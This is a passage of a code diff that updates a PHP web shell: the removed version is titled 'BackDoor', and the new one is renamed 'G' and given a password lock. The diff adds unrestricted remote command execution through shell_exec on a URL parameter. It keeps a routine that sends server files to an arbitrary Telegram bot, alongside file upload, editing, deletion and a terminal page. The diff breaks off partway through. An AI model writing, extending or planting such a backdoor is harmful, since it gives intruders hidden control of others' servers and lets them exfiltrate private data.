@@ -1,441 +1,284 @@
 <?php
-#++++++++++++++++++++++ https://github.com/ERRORIP ++++++++++++++++++++++#
+$panel_name = 'G';
+session_start();
+
+$db_file = '.gpanel_db.json';
+
+function get_db() {
+    global $db_file;
+    if (!file_exists($db_file)) {
+        return ['locked' => false, 'password_hash' => null];
+    }
+    $content = @file_get_contents($db_file);
+    return $content ? json_decode($content, true) : ['locked' => false, 'password_hash' => null];
+}
+
+function save_db($data) {
+    global $db_file;
+    file_put_contents($db_file, json_encode($data, JSON_PRETTY_PRINT));
+}
+
+if (!file_exists($db_file)) {
+    save_db(['locked' => false, 'password_hash' => null]);
+}
+
+$db = get_db();
+
+if ($db['locked'] && !isset($_SESSION['gpanel_logged_in'])) {
+    $login_error = '';
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        if (password_verify($_POST['password'], $db['password_hash'])) {
+            $_SESSION['gpanel_logged_in'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF'] . '?' . http_build_query($_GET));
+            exit;
+        } else {
+            $login_error = 'Incorrect password.';
+        }
+    }
+    
+    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login - ' . $panel_name . '</title><style>body{background:#121212;color:#e0e0e0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.login-container{background:rgb(30,30,30);padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.7);text-align:center;width:90%;max-width:350px;}h1{margin-bottom:20px;color:#4da6ff;}input[type=password]{width:100%;box-sizing:border-box;padding:12px;margin:10px 0;border:none;border-radius:5px;background:rgb(51,51,51);color:#e0e0e0;}input[type=submit]{padding:12px;border:none;border-radius:5px;background:#4da6ff;color:#fff;cursor:pointer;width:100%;}.error{color:#ff4d4d;margin-top:10px;}</style></head><body><div class="login-container"><h1>' . $panel_name . ' Locked</h1><form method="post"><input type="password" name="password" placeholder="Enter Password" required><br><input type="submit" value="Unlock"></form>';
+    if (isset($login_error)) {
+        echo '<div class="error">' . $login_error . '</div>';
+    }
+    echo '</div></body></html>';
+    exit;
+}
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+function g1($x){ return htmlspecialchars(strip_tags($x)); }
+function format_bytes($bytes, $precision = 2) { 
+    $units = ['B', 'KB', 'MB', 'GB', 'TB']; 
+    $bytes = max($bytes, 0); 
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); 
+    $pow = min($pow, count($units) - 1); 
+    $bytes /= pow(1024, $pow);
+    return round($bytes, $precision) . ' ' . $units[$pow]; 
+}
+function recursive_delete($path) {
+    if (is_dir($path)) {
+        $files = array_diff(scandir($path), ['.', '..']);
+        foreach ($files as $file) {
+            recursive_delete($path . DIRECTORY_SEPARATOR . $file);
+        }
+        return rmdir($path);
+    } else {
+        return unlink($path);
+    }
+}
+
 if(isset($_GET['telegram_download'])){
-    $file=$_GET['file'];
-    $token=$_GET['token'];
-    $chat_id=$_GET['chat_id'];
-    if(file_exists($file)){
-        $url="https://api.telegram.org/bot".$token."/sendDocument";
-        $post_fields=['chat_id'=>$chat_id,'document'=>new CURLFile(realpath($file))];
-        $ch=curl_init();
-        curl_setopt($ch,CURLOPT_HTTPHEADER,["Content-Type:multipart/form-data"]);
-        curl_setopt($ch,CURLOPT_URL,$url);
-        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
-        curl_setopt($ch,CURLOPT_POSTFIELDS,$post_fields);
-        $output=curl_exec($ch);
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+    $file_path = $dir . '/' . basename($_GET['file']);
+    if(file_exists($file_path) && is_file($file_path)){
+        $token = $_GET['token'];
+        $chat_id = $_GET['chat_id'];
+        $url = "https://api.telegram.org/bot" . $token . "/sendDocument";
+        $post_fields = ['chat_id' => $chat_id, 'document' => new CURLFile(realpath($file_path))];
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
+        $output = curl_exec($ch);
         curl_close($ch);
         echo $output;
-        exit;
     } else {
+        http_response_code(404);
         echo "File not found.";
-        exit;
-    }
-}
-if(isset($_GET['download'])){
-    $file = $_GET['file'];
-    if(file_exists($file)){
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="'.basename($file).'"');
-        header('Expires: 0');
-        header('Cache-Control: must-revalidate');
-        header('Pragma: public');
-        header('Content-Length: ' . filesize($file));
-        readfile($file);
-        exit;
-    } else {
-        echo "File not found.";
-        exit;
-    }
-}
-if(isset($_GET['tcmd'])){
-    $_c=trim($_GET['tcmd']);
-    if($_c==='ls'){
-        $_f=scandir(getcwd());
-        $_o="";
-        foreach($_f as $_v){
-            if($_v==="."||$_v==="..") continue;
-            $_o.=$_v."\n";
-        }
-        echo nl2br($_o);
-    } elseif($_c==='pwd'){
-        echo getcwd();
-    } else {
-        echo "Command not recognized.";
     }
     exit;
 }
-$_p=isset($_GET['page'])?$_GET['page']:'home';
-$_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
+
+if(isset($_GET['download'])){
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+    $file_path = $dir . '/' . basename($_GET['file']);
+    if(file_exists($file_path) && is_file($file_path)){
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file_path));
+        readfile($file_path);
+    } else {
+        http_response_code(404);
+        echo "File not found.";
+    }
+    exit;
+}
+
+if(isset($_GET['tcmd'])){
+    $_c = trim($_GET['tcmd']);
+    $output = '';
+    if(function_exists('shell_exec')) {
+        $output = shell_exec($_c . ' 2>&1');
+    } else {
+        $output = "shell_exec is disabled.";
+    }
+    echo nl2br(htmlspecialchars($output));
+    exit;
+}
+
+$_p = isset($_GET['page']) ? $_GET['page'] : 'home';
+$_d = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+if (!$_d || !is_dir($_d)) {
+    $_d = getcwd();
+}
+
 ?><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BackDoor</title>
+    <title><?php echo $panel_name; ?></title>
     <link rel="icon" href="https://cdn1.iconfinder.com/data/icons/social-black-buttons/512/anonymous-512.png">
     <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/codemirror.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/theme/dracula.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/xterm/4.19.0/xterm.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/theme/dracula.min.css">
     <style>
-        * { margin:0; padding:0; box-sizing:border-box }
-        body {
-            font-family:"Roboto", sans-serif;
-            background: #121212;
-            color: #e0e0e0;
-            overflow-x:hidden;
-            margin:0;
-            padding:0
-        }
-        #matrixCanvas {
-            position:fixed;
-            top:0;
-            left:0;
-            width:100%;
-            height:100%;
-            z-index:-1
-        }
-        #header {
-            background: rgb(30,30,30);
-            padding:15px 20px;
-            display:flex;
-            justify-content:space-between;
-            align-items:center;
-            border-bottom:1px solid #333
-        }
-        #header h1 { font-size:1.8em }
-        #nav a {
-            color:#e0e0e0;
-            margin-left:20px;
-            text-decoration:none;
-            font-weight:500;
-            transition:color .3s
-        }
-        #nav a:hover { color:#4da6ff }
-        #container {
-            max-width:1200px;
-            margin:20px auto;
-            background: rgb(30,30,30);
-            padding:30px;
-            border-radius:8px;
-            box-shadow:0 4px 12px rgba(0,0,0,0.7);
-            animation:fadeIn 1s
-        }
-        h2, h3 { text-align:center; margin-bottom:20px }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:"Roboto", sans-serif; background: #121212; color: #e0e0e0; }
+        #matrixCanvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; }
+        #header { background: rgb(30,30,30); padding:15px 20px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #333; flex-wrap: wrap; gap: 1rem; }
+        #header h1 { font-size:1.8em; }
+        #nav { display: flex; flex-wrap: wrap; justify-content: center; }
+        #nav a { color:#e0e0e0; margin: 5px 10px; text-decoration:none; font-weight:500; transition:color .3s; }
+        #nav a:hover { color:#4da6ff; }
+        #container { padding: 20px; }
+        .content-box { background: rgba(30, 30, 30, 0.85); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); padding:30px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.7); animation:fadeIn 1s; margin: 20px auto; }
+        h2, h3 { text-align:center; margin-bottom:20px; }
         p { margin-bottom:20px }
-        .breadcrumb {
-            margin-bottom:20px;
-            padding:10px;
-            background: rgb(42,42,42);
-            border-radius:5px;
-            display:inline-block
-        }
-        .breadcrumb-item a {
-            color:#4da6ff;
-            text-decoration:none;
-            padding:4px 8px;
-            background: rgb(30,30,30);
-            border-radius:3px
-        }
-        .breadcrumb-item a:hover { background:#333 }
-        .breadcrumb-separator { margin:0 5px; color:#e0e0e0 }
-        #back {
-            margin:10px 0;
-            display:inline-block;
-            color:#fff;
-            background:#ff4d4d;
-            padding:8px 12px;
-            border-radius:5px;
-            text-decoration:none
-        }
-        #back:hover { background:#ff1a1a }
+        .breadcrumb { margin-bottom:20px; padding:10px; background: rgb(42,42,42); border-radius:5px; display:inline-block; }
+        .breadcrumb-item a { color:#4da6ff; text-decoration:none; }
+        .breadcrumb-separator { margin:0 5px; color:#e0e0e0; }
         .file-list { list-style:none; padding:0 }
-        .file-list li {
-            display:flex;
-            align-items:center;
-            justify-content:space-between;
-            background: rgb(42,42,42);
-            margin-bottom:8px;
-            padding:8px 12px;
-            border-radius:5px;
-            transition:background .3s, transform .3s;
-            cursor:pointer
-        }
-        .file-list li:hover {
-            background:#333;
-            transform:translateX(5px)
-        }
-        .file-info { display:flex; flex-direction:column }
-        .fn { font-weight:bold }
-        .details { font-size:0.8em; color:#aaa }
-        .dd { position:relative }
-        .ddb {
-            background:transparent;
-            border:none;
-            color:#e0e0e0;
-            font-size:1.2em;
-            cursor:pointer
-        }
-        .ddc {
-            display:none;
-            position:absolute;
-            right:0;
-            background: rgb(42,42,42);
-            min-width:140px;
-            border-radius:5px;
-            box-shadow:0 8px 16px rgba(0,0,0,0.3);
-            z-index:9999
-        }
-        .ddc a {
-            color:#e0e0e0;
-            padding:8px 12px;
-            text-decoration:none;
-            display:block;
-            transition:background .3s
-        }
-        .ddc a:hover { background:#444 }
-        .dd.open .ddc { display:block }
-        form {
-            margin-top:20px;
-            display:flex;
-            flex-direction:column;
-            gap:15px
-        }
-        input[type="text"],
-        input[type="file"],
-        textarea {
-            width:100%;
-            padding:12px;
-            border:none;
-            border-radius:5px;
-            background: rgb(51,51,51);
-            color:#e0e0e0;
-            font-size:1em;
-            outline:none;
-            transition:background .3s
-        }
-        input[type="text"]:focus,
-        input[type="file"]:focus,
-        textarea:focus { background:#444 }
-        input[type="submit"], button {
-            padding:12px;
-            border:none;
-            border-radius:5px;
-            background:#4da6ff;
-            color:#fff;
-            font-size:1em;
-            font-weight:bold;
-            cursor:pointer;
-            transition:background .3s, transform .3s
-        }
-        input[type="submit"]:hover,
-        button:hover { background:#80c1ff; transform:scale(1.05) }
+        .file-list li { display:flex; align-items:center; background: rgb(42,42,42); margin-bottom:8px; padding:8px 12px; border-radius:5px; transition:background .3s; position: relative; }
+        .file-list li:hover { background:#333; }
+        .file-list li.menu-open { z-index: 10; }
+        .file-info { display:flex; align-items: center; flex-grow: 1; cursor:pointer; min-width: 0; }
+        .file-details { display:flex; flex-direction:column; min-width: 0; }
+        .fn { font-weight:bold; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .details { font-size:0.8em; color:#aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .dd { position:relative; }
+        .ddb { background:transparent; border:none; color:#e0e0e0; font-size:1.2em; cursor:pointer; padding: 5px; }
+        .ddc { display:none; position:absolute; right:0; top: 100%; background: rgb(50,50,50); min-width:140px; border-radius:5px; box-shadow:0 8px 16px rgba(0,0,0,0.3); z-index:9999; }
+        .ddc a { color:#e0e0e0; padding:8px 12px; text-decoration:none; display:block; transition:background .3s; }
+        .ddc a:hover { background:#555; }
+        .dd.open .ddc { display:block; }
+        form { margin-top:20px; display:flex; flex-direction:column; gap:15px; }
+        input[type="text"], input[type="password"], input[type="file"], textarea { width:100%; padding:12px; border:none; border-radius:5px; background: rgb(51,51,51); color:#e0e0e0; font-size:1em; outline:none; transition:background .3s; }
+        input[type="submit"], button, .btn { padding:12px; border:none; border-radius:5px; background:#4da6ff; color:#fff; font-size:1em; font-weight:bold; cursor:pointer; transition: background .3s; text-decoration: none; }
+        input[type="submit"]:hover, button:hover, .btn:hover { background:#80c1ff; }
+        .btn-danger { background:#ff4d4d; }
+        .btn-danger:hover { background:#ff1a1a; }
         hr { border:0; height:1px; background:#555; margin:30px 0 }
-        .CodeMirror {
-            height:auto;
-            border:1px solid #444;
-            font-size:1em;
-            background: rgb(46,46,46);
-            color:#e0e0e0
-        }
-        #terminal-container {
-            margin-top:40px;
-            border:1px solid #444;
-            border-radius:5px;
-            padding:10px;
-            background: rgb(30,30,30);
-            height:300px;
-            overflow-y:auto
-        }
-        #terminal-input-container {
-            margin-top:10px;
-            display:flex
-        }
-        #terminal-input-container input[type="text"] {
-            flex:1;
-            padding:10px;
-            border:none;
-            border-radius:5px 0 0 5px;
-            background: rgb(51,51,51);
-            color:#e0e0e0
-        }
-        #terminal-input-container button {
-            padding:10px;
-            border:none;
-            border-radius:0 5px 5px 0;
-            background:#4da6ff;
-            color:#fff;
-            cursor:pointer
-        }
-        .info-box {
-            background: rgb(34,34,34);
-            padding:20px;
-            border-radius:8px;
-            box-shadow:0 4px 10px rgba(0,0,0,0.7)
-        }
-        .info-box table {
-            width:100%;
-            border-collapse:collapse
-        }
-        .info-box th,
-        .info-box td {
-            padding:10px;
-            border:1px solid #444;
-            text-align:left
-        }
-        .info-box th { background:#333; color:#4da6ff }
-        .modal-overlay {
-            position:fixed;
-            top:0;
-            left:0;
-            width:100%;
-            height:100%;
-            background:rgba(0,0,0,0.8);
-            display:none;
-            align-items:center;
-            justify-content:center;
-            z-index:10000
-        }
-        .modal {
-            background: rgb(30,30,30);
-            padding:20px;
-            border-radius:8px;
-            width:300px;
-            text-align:center;
-            position: relative;
-        }
-        .modal input[type="password"],
-        .modal input[type="text"] {
-            width:calc(100% - 20px);
-            padding:8px;
-            margin:8px 10px;
-            border:1px solid #444;
-            border-radius:4px;
-            background: rgb(51,51,51);
-            color:#e0e0e0
-        }
-        .modal button {
-            margin-top:10px;
-            padding:8px 16px;
-            background:#4da6ff;
-            border:none;
-            border-radius:4px;
-            cursor:pointer
-        }
-        .close-modal {
-            position: absolute;
-            top: 8px;
-            right: 8px;
-            cursor: pointer;
-            font-size: 24px;
-            color: #e0e0e0;
-        }
-        #telegramModal { display:none }
-        #progressContainer {
-            width:100%;
-            background:#bbb;
-            height:20px;
-            border-radius:4px;
-            margin:10px 0;
-            display:none
-        }
-        #progressBar {
-            width:0%;
-            height:100%;
-            background:#888;
-            border-radius:4px
-        }
-        @keyframes fadeIn {
-            from { opacity:0; transform:translateY(20px) }
-            to { opacity:1; transform:translateY(0) }
-        }
+        .CodeMirror { height:60vh; border:1px solid #444; font-size:1em; background: rgb(46,46,46); color:#e0e0e0; border-radius: 5px; }
+        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:none; align-items:center; justify-content:center; z-index:10000; }
+        .modal { background: rgb(30,30,30); padding:20px; border-radius:8px; width:90%; max-width:400px; text-align:center; position: relative; }
+        .close-modal { position: absolute; top: 8px; right: 8px; cursor: pointer; font-size: 24px; color: #e0e0e0; }
+        .file-checkbox { -webkit-appearance: none; -moz-appearance: none; appearance: none; width: 18px; height: 18px; background-color: #333; border: 1px solid #555; border-radius: 3px; cursor: pointer; position: relative; outline: none; transition: background-color 0.2s; margin-right: 15px; }
+        .file-checkbox:checked { background-color: #4da6ff; border-color: #4da6ff; }
+        .file-checkbox:checked::after { content: ''; position: absolute; left: 5px; top: 1px; width: 5px; height: 10px; border: solid white; border-width: 0 3px 3px 0; transform: rotate(45deg); }
+        .action-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 1rem; }
+        #multi-select-actions { display: none; gap: 1rem; flex-wrap: wrap; }
+        @keyframes fadeIn { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
     </style>
 </head>
 <body>
     <canvas id="matrixCanvas"></canvas>
-    <script>
-        function matrixEffect(){
-            var c=document.getElementById("matrixCanvas"), ctx=c.getContext("2d");
-            c.height=window.innerHeight;
-            c.width=window.innerWidth;
-            var l="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split(""), fs=16, cols=c.width/fs, drops=[];
-            for(var i=0;i<cols;i++) drops[i]=1;
-            function d(){
-                ctx.fillStyle="rgba(18,18,18,0.05)";
-                ctx.fillRect(0,0,c.width,c.height);
-                ctx.fillStyle="#790604";
-                ctx.font=fs+"px monospace";
-                for(var j=0;j<drops.length;j++){
-                    var t=l[Math.floor(Math.random()*l.length)];
-                    ctx.fillText(t,j*fs,drops[j]*fs);
-                    if(drops[j]*fs>c.height&&Math.random()>0.975) drops[j]=0;
-                    drops[j]++;
-                }
-            }
-            setInterval(d,35);
-        }
-        matrixEffect();
-    </script>
+    
     <div id="header">
-        <h1>BackDoor</h1>
+        <h1><?php echo $panel_name; ?></h1>
         <div id="nav">
             <a href="?page=home&dir=<?php echo urlencode($_d); ?>">File Manager</a>
             <a href="?page=upload&dir=<?php echo urlencode($_d); ?>">Upload File</a>
             <a href="?page=terminal&dir=<?php echo urlencode($_d); ?>">Terminal</a>
             <a href="?page=info&dir=<?php echo urlencode($_d); ?>">Info</a>
-            <a href="javascript:void(0)" id="lockToggle" onclick="toggleLock()">Lock Off</a>
-            <!-- GitHub button added -->
+            <a href="?page=security&dir=<?php echo urlencode($_d); ?>">Security</a>
             <a href="https://github.com/ERRORIP" target="_blank">GitHub</a>
+            <?php if ($db['locked']): ?>
+                <a href="?logout=1">Logout</a>
+            <?php endif; ?>
         </div>
     </div>
     <div id="container">
+        <div class="content-box">
         <?php
-        function g1($x){ return htmlspecialchars(strip_tags($x)); }
-        function g2($x){
+        function g2_breadcrumb($x){
             $x=str_replace("\\","/",$x);
             $parts=array_filter(explode("/",$x),'strlen');
-            $r='<div class="breadcrumb"><span class="breadcrumb-item"><a href="?dir=/">/</a></span>';
+            $r='<div class="breadcrumb"><span class="breadcrumb-item"><a href="?page=home&dir=/">/</a></span>';
             $cp="";
             foreach($parts as $p){
                 $cp.="/".$p;
-                $r.='<span class="breadcrumb-separator">/</span><span class="breadcrumb-item"><a href="?dir='.urlencode($cp).'">'.$p.'</a></span>';
+                $r.='<span class="breadcrumb-separator">/</span><span class="breadcrumb-item"><a href="?page=home&dir='.urlencode($cp).'">'.$p.'</a></span>';
             }
             return $r.'</div>';
         }
-        function g3($x){
+
+        function g3_file_manager($x){
+            echo '<div class="action-bar">';
+            echo '<div><label style="display:flex; align-items:center; gap:10px; cursor: pointer;"><input type="checkbox" id="select-all" class="file-checkbox" style="margin-right:10px;"> Select All</label></div>';
+            echo '<div id="multi-select-actions"><button id="download-selected-btn" class="btn">Download</button><button id="compress-selected-btn" class="btn">Compress</button><button id="move-selected-btn" class="btn">Move</button><button id="delete-selected-btn" class="btn btn-danger">Delete</button></div>';
+            echo '</div>';
+            
             $f=scandir($x);
-            $fh=array();
-            $ff=array();
+            $fh=array(); $ff=array();
             foreach($f as $v){
                 if($v=="."||$v=="..") continue;
                 $p=$x."/".$v;
                 $m=date("Y-m-d H:i:s",filemtime($p));
-                $o=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($p))['name']:fileowner($p);
-                $g=function_exists('posix_getgrgid')?posix_getgrgid(filegroup($p))['name']:filegroup($p);
                 $perm=substr(sprintf('%o',fileperms($p)),-4);
+                
+                $item_html_start = '<li><input type="checkbox" class="file-checkbox" value="'.g1($v).'">';
+                
                 if(is_dir($p)){
-                    $d='<div class="details">Size: - | Modify: '.$m.' | Owner/Group: '.$o.'/'.$g.' | Perms: '.$perm.'</div>';
-                    $fh[]='<li><div class="file-info" onclick="folderOpen(\''.urlencode($p).'\',event)"><img src="https://www.iconpacks.net/icons/2/free-icon-folder-1485.png" style="width:20px;vertical-align:middle;margin-right:5px;"><span class="fn">'.$v.'</span>'.$d.'</div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc"><a href="?action=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?action=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="?action=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a><a href="?action=compress&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a><a href="?action=delete&file='.urlencode($v).'&dir='.urlencode($x).'">Delete</a></div></div></li>';
+                    $d='<div class="details">Directory | Modify: '.$m.' | Perms: '.$perm.'</div>';
+                    $item_html_content = '<div class="file-info" onclick="window.location.href=\'?page=home&dir='.urlencode($p).'\';"><img src="https://www.iconpacks.net/icons/2/free-icon-folder-1485.png" style="width:20px;vertical-align:middle;margin-right:5px;"><div class="file-details"><span class="fn">'.$v.'</span>'.$d.'</div></div>';
+                    $item_html_end = '<div style="margin-left:auto;"></div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc"><a href="?page=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?page=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="?page=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a><a href="?action=compress_single&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a><a href="?action=delete_single&file='.urlencode($v).'&dir='.urlencode($x).'" onclick="return confirm(\'Sure?\')">Delete</a></div></div></li>';
+                    $fh[] = $item_html_start . $item_html_content . $item_html_end;
                 } else {
                     $s=filesize($p);
-                    $u=['B','KB','MB','GB','TB'];
-                    $w=$s>0?floor(log($s,1024)):0;
-                    $rs=$s?round($s/pow(1024,$w),2)." ".$u[$w]:"0 B";
-                    $d='<div class="details">Size: '.$rs.' | Modify: '.$m.' | Owner/Group: '.$o.'/'.$g.' | Perms: '.$perm.'</div>';
-                    $ext = pathinfo($v, PATHINFO_EXTENSION);
-                    $prog_ext = array("php","js","html","css","py","java","c","cpp","cs","rb","go","ts","jsx","tsx");
-                    if(in_array(strtolower($ext), $prog_ext)){
-                        $icon = "https://images.freeimages.com/fic/images/icons/2813/flat_jewels/512/file.png";
+                    $rs=format_bytes($s);
+                    $d='<div class="details">Size: '.$rs.' | Modify: '.$m.' | Perms: '.$perm.'</div>';
+                    $item_html_content = '<div class="file-info" onclick="location.href=\'?page=edit&file='.urlencode($v).'&dir='.urlencode($x).'\'"><img src="https://images.freeimages.com/fic/images/icons/2813/flat_jewels/512/file.png" style="width:20px;vertical-align:middle;margin-right:5px;"><div class="file-details"><span class="fn">'.$v.'</span>'.$d.'</div></div>';
+                    
+                    $actions = '<a href="?page=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?page=edit&file='.urlencode($v).'&dir='.urlencode($x).'">Edit</a><a href="?page=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="javascript:void(0)" onclick="openDownloadModal(\''.g1($v).'\')">Download</a><a href="?page=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a>';
+                    
+                    $ext = pathinfo($p, PATHINFO_EXTENSION);
+                    if ($ext === 'zip') {
+                        $actions .= '<a href="?action=unzip&file='.urlencode($v).'&dir='.urlencode($x).'">Unzip</a>';
                     } else {
-                        $icon = "https://images.freeimages.com/fic/images/icons/2813/flat_jewels/512/file.png";
+                         $actions .= '<a href="?action=compress_single&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a>';
                     }
-                    $ff[]='<li><div class="file-info"><img src="'.$icon.'" style="width:20px;vertical-align:middle;margin-right:5px;"><span class="fn" onclick="location.href=\'?action=edit&file='.urlencode($v).'&dir='.urlencode($x).'\'">'.$v.'</span>'.$d.'</div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc"><a href="?action=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?action=edit&file='.urlencode($v).'&dir='.urlencode($x).'">Edit</a><a href="?action=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="javascript:void(0)" onclick="sendToTelegram(\''.$p.'\')">Download</a><a href="?action=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a><a href="?action=compress&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a><a href="?action=delete&file='.urlencode($v).'&dir='.urlencode($x).'" onclick="return confirm(\'Sure?\');">Delete</a></div></div></li>';
+
+                    $actions .= '<a href="?action=delete_single&file='.urlencode($v).'&dir='.urlencode($x).'" onclick="return confirm(\'Sure?\');">Delete</a>';
+
+                    $item_html_end = '<div style="margin-left:auto;"></div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc">'.$actions.'</div></div></li>';
+                    $ff[] = $item_html_start . $item_html_content . $item_html_end;
                 }
             }
             echo '<ul class="file-list">'.implode("",$fh).(count($fh)&&count($ff)?'<hr>':'').implode("",$ff).'</ul>';
         }
-        function g4($x,$n){
+
+        function g4_create_folder($x,$n){
             $n=g1($n);
             $p=$x."/".$n;
             if(!file_exists($p)){
                 mkdir($p);
-                echo "<p style=\"color:#4da6ff;text-align:center;\">Folder '$n' created.</p>";
+                echo "<p style=\"color:#4da6ff;text-align:center;\">Folder '$n' created. <a href='?page=home&dir=".urlencode($x)."'>Refresh</a></p>";
             } else {
                 echo "<p style=\"color:#ff4d4d;text-align:center;\">Folder '$n' exists.</p>";
             }
         }
-        function g5($x,$f){
+
+        function g5_upload_file($x,$f){
             if(!is_dir($x)){
                 echo "<p style=\"color:#ff4d4d;text-align:center;\">Directory does not exist.</p>";
                 return;
@@ -447,9 +290,10 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
                 echo "<p style=\"color:#ff4d4d;text-align:center;\">Upload error.</p>";
             }
         }
-        function g6($p){
-            if($_SERVER['REQUEST_METHOD']==='POST'){
-                $c=stripslashes($_POST['file_content']);
+
+        function g6_edit_file($p){
+            if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['file_content'])){
+                $c=$_POST['file_content'];
                 if(file_put_contents($p,$c)!==false){
                     echo "<p style=\"color:#4da6ff;text-align:center;\">Saved.</p>";
                 } else {
@@ -457,375 +301,282 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
                 }
             }
             $c=file_get_contents($p);
-            echo '<form method="post"><textarea id="codeEditor" name="file_content" rows="10" cols="50">'.htmlspecialchars($c).'</textarea><br><input type="submit" value="Save"></form><br><button onclick="if(confirm(\'Sure?\')){location.href=\'?action=delete&file='.urlencode(basename($p)).'&dir='.urlencode(dirname($p)).'\'}">Delete</button>';
+            echo '<form method="post"><textarea id="codeEditor" name="file_content">'.htmlspecialchars($c).'</textarea><br><input type="submit" value="Save" class="btn"></form><br><a href="?page=home&dir='.urlencode(dirname($p)).'" class="btn btn-danger">Back</a>';
         }
+
         if(isset($_GET['action'])){
             $_a=$_GET['action'];
             switch($_a){
-                case 'edit':
-                    if(isset($_GET['file'])){
-                        $x=stripslashes($_GET['file']);
-                        $p=$_d."/".$x;
-                        if(file_exists($p)){
-                            echo "<h2>Edit: $x</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                            g6($p);
-                        } else {
-                            echo "<p style=\"color:#ff4d4d;text-align:center;\">Not found.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                        }
-                    } else {
-                        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                    }
-                    break;
-                case 'view':
-                    if(isset($_GET['file'])){
-                        $x=stripslashes($_GET['file']);
-                        $p=$_d."/".$x;
-                        if(file_exists($p)){
-                            echo "<h2>View: $x</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                            echo "<pre style=\"background:rgb(46,46,46);padding:15px;border-radius:5px;\">".htmlspecialchars(file_get_contents($p))."</pre>";
-                        } else {
-                            echo "<p style=\"color:#ff4d4d;text-align:center;\">Not found.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                        }
-                    } else {
-                        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                    }
-                    break;
-                case 'delete':
-                    if(isset($_GET['file'])){
-                        $x=stripslashes($_GET['file']);
-                        $p=$_d."/".$x;
